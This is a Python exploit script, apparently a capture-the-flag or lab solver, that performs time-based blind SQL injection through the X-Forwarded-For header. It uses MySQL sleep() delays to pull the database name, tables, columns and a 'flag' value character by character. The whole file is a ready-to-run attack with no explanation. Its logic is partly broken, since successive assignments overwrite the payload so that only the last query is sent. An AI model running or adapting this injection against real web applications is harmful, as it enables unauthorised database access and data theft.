#!/usr/bin/python3                                                                                                                                                           
                                                                                                                                                                             
import requests, time, sys, signal                                                                                                                                           
from pwn import *                                                                                                                                                            
                                                                                                                                                                             
def def_handler(signal, frame):                                                                                                                                              
        log.failure("Exiting")                                                                                                                                               
        sys.exit(1)                                                                                                                                                          
                                                                                                                                                                             
signal.signal(signal.SIGINT, def_handler)                                                                                                                                    
                                                                                                                                                                             
time.sleep(10)                                                                                                                                                               
                                                                                                                                                                             
url = 'http://10.10.10.10/url'                                                                                                                            
s = r'0123456789abcdefghijklmnopqrstuvwxyz-_{}:'                                                                                                                              
result = ''                                                                                                                                                                  
                                                                                                                                                                             
def check(payload):                                                                                                                                                          

        headers_post = {
                                'X-Forwarded-For' : '%s' %payload
        }

        time_start = time.time()
        content = requests.post(url, headers=headers_post)
        time_end = time.time()

        if time_end - time_start > 5:
                return 1

#p1 = log.progress("Database")
p2 = log.progress("Payload")

for j in range(0,3):
        #p1 = log.progress("Table [%d]" % j)
        p1 = log.progress("Column [%d]" % j)
        for i in range(0, 10): #50 if we need a hash/flag
                for c in s:
                        # Database
                        payload = "127.0.0.1' and (select sleep(5) from information_schema.tables where (substr(database(),%d,1)='%c')) -- -" % (i, c)
                        # Tables
                        payload = "127.0.0.1' and (select sleep(5) from information_schema.tables where (substr((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1)='%c')) -- -" % (j, i, c)
                        # Columns
                        payload = "127.0.0.1' and (select sleep(5) from information_schema.tables where (substr((select column_name from information_schema.columns where table_name='flag' limit %d,1),%d,1)='%c')) -- -" % (j, i, c)
                        # Flag / hash / data of interest
                        payload = "127.0.0.1' and (select sleep(5) from information_schema.tables where (substr((select flag from flag),%d,1)='%c')) -- -" % (i, c)

                        if check(payload):
                                result += c
                                p1.status("%s" % result)
                                break

        p1.success("%s" % result)
        result=''
